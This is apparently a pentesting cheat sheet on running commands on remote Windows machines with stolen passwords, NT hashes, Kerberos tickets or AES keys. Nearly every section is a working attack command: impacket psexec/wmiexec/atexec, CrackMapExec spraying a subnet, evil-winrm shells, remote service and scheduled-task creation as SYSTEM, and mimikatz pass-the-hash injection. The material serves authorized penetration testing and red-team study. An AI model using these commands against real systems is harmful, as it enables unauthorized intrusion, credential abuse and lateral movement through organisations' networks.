**Windows remote command execution** — when you hold proof-of-identity for an account that has rights on a remote Windows machine, you use it to run commands on that box and land a shell. The proof can be the account's password, its NT hash (the scrambled form of the password that Windows will accept in place of the plaintext), a Kerberos ticket (a signed token that vouches you already logged in), or an AES key (the account's Kerberos encryption key). Mechanically, a tool authenticates to the target over SMB (445), WMI/DCOM (135), or WinRM (5985/5986) and starts your process there; most of these require the account to be local admin on the target. This is the common final step of most AD attacks — "use the ticket / hash to get a shell".

## Authentication material

Every tool below accepts one of these. Pick the flag that matches what you have.

| You have | impacket flag | Notes |
| --- | --- | --- |
| Cleartext password | `DOMAIN/USER:PASS@TARGET` | prompted if omitted |
| NT hash (pass-the-hash) | `-hashes ':NT_HASH'` | LM can be blank |
| Kerberos ticket (pass-the-ticket) | `-k -no-pass` | needs `KRB5CCNAME` set |
| AES key (overpass-the-hash) | `-aesKey 'AES_KEY'` | stealthier than RC4 |

Using a Kerberos ticket:

```bash

export KRB5CCNAME=/path/to/ticket.ccache
psexec.py -k -no-pass 'DOMAIN/USER_NAME@TARGET_FQDN'

```

**Note:** With Kerberos always target the **FQDN**, not the IP - otherwise the client falls back to NTLM (or fails with `KDC_ERR_S_PRINCIPAL_UNKNOWN`).

## Impacket exec family

| Tool | Mechanism | Port(s) | Footprint |
| --- | --- | --- | --- |
| `psexec.py` | service + named pipe (like SysInternals) | 445 | drops a service binary - noisy |
| `smbexec.py` | service, no binary dropped | 445 | semi-interactive, cleaner |
| `wmiexec.py` | WMI (`Win32_Process`) | 135 + 445 | no service, popular, semi-interactive |
| `atexec.py` | scheduled task | 445 | runs one command |
| `dcomexec.py` | DCOM (MMC20 / ShellWindows) | 135 + 445 | alternative to WMI |

All require the account to be **local admin** on the target (they use the `ADMIN$` share / service control).

```bash

# Password
wmiexec.py 'DOMAIN/USER_NAME:USER_PASS@TARGET'

# Pass-the-hash
psexec.py -hashes ':NT_HASH' 'DOMAIN/Administrator@TARGET'

# Pass-the-ticket
export KRB5CCNAME=ADM_NAME@cifs_TARGET_FQDN.ccache
psexec.py -k -no-pass 'DOMAIN/ADM_NAME@TARGET_FQDN'

# One-off command
atexec.py 'DOMAIN/USER_NAME:USER_PASS@TARGET' 'whoami'

```

**Note:** These tools are published both as scripts (`psexec.py`) and as Kali wrappers (`impacket-psexec`); the arguments are identical.

## CrackMapExec / NetExec

Great for spraying one command across many hosts, and for checking where an account is admin (`(Pwn3d!)`).

```bash

# Check admin access across a subnet
cme smb 10.10.10.0/24 -u 'USER_NAME' -p 'USER_PASS'

# Run a command (SMB uses wmiexec/smbexec under the hood)
cme smb TARGET -u 'USER_NAME' -p 'USER_PASS' -x 'whoami'         # cmd
cme smb TARGET -u 'USER_NAME' -p 'USER_PASS' -X 'whoami'         # powershell

# Pass-the-hash / local account
cme smb TARGET -u 'Administrator' -H 'NT_HASH' --local-auth -x 'whoami'

```

## WinRM - evil-winrm

Full interactive shell over WinRM (`5985`/`5986`). The account must be in **Remote Management Users** or local admin.

```bash

evil-winrm -i TARGET -u 'USER_NAME' -p 'USER_PASS'
# Pass-the-hash
evil-winrm -i TARGET -u 'Administrator' -H 'NT_HASH'
# Kerberos
export KRB5CCNAME=ticket.ccache
evil-winrm -i TARGET_FQDN -u 'USER_NAME' -r DOMAIN

```

## From a Windows host (native tooling)

```powershell

# WinRM
Enter-PSSession -ComputerName TARGET -Credential DOMAIN\USER_NAME
Invoke-Command -ComputerName TARGET -ScriptBlock { whoami } -Credential DOMAIN\USER_NAME
winrs -r:TARGET -u:DOMAIN\USER_NAME -p:USER_PASS "whoami"

# SysInternals PsExec (needs local admin)
.\PsExec.exe -accepteula \\TARGET -u DOMAIN\USER_NAME -p USER_PASS cmd
# With a Kerberos ticket already in the session
.\PsExec.exe -accepteula \\TARGET_FQDN cmd

# Service / scheduled task (local admin on TARGET)
sc.exe \\TARGET create svc binPath= "cmd /c COMMAND" & sc.exe \\TARGET start svc
schtasks /create /s TARGET /tn t /tr "cmd /c COMMAND" /sc once /st 00:00 /ru SYSTEM & schtasks /run /s TARGET /tn t

# WMI
wmic /node:TARGET /user:DOMAIN\USER_NAME /password:USER_PASS process call create "cmd /c COMMAND"

```

## Pass-the-hash / overpass-the-hash from Windows (mimikatz)

Inject a hash into a new logon session, then use native tools (which now authenticate as that user):

```powershell

privilege::debug
sekurlsa::pth /user:USER_NAME /domain:DOMAIN /ntlm:NT_HASH /run:powershell.exe
# In the spawned shell:
.\PsExec.exe \\TARGET cmd

```

## References

- impacket - https://github.com/fortra/impacket
- CrackMapExec / NetExec - https://github.com/Pennyw0rth/NetExec
- evil-winrm - https://github.com/Hackplayers/evil-winrm
- The Hacker Recipes - Lateral movement - https://www.thehacker.recipes/ad/movement/
